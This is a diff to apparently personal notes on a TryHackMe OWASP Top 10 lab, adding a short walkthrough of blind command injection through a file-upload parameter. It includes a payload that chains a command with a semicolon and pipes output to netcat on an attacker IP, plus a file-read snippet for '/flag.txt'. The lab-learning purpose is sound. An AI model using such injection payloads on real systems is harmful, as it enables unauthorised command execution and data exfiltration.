@@ -26,8 +26,18 @@ require('fs').readFileSync('/flag.txt').toString();
 
 ### Blind Command Injection via file upload 
 
+The webapp allows you to upload a file and lets you select a parameter while uploading 
+the burp request shows the contents of the file and the parameter selected 
+we try injecting code in the txt file we upload but it doesn't execute 
+We then try injecting in the parameter field.
 
+below is the payload used in the parameter field
+```sh
+bytebuster ; whoami | nc 10.17.117.61 4444; 
+```
 
+`;` are real important 
+open a [[netcat]] listener on another terminal 
 
 ### References
 [TryHackMe | OWASP Top 10 - 2021](https://tryhackme.com/r/room/owasptop102021)
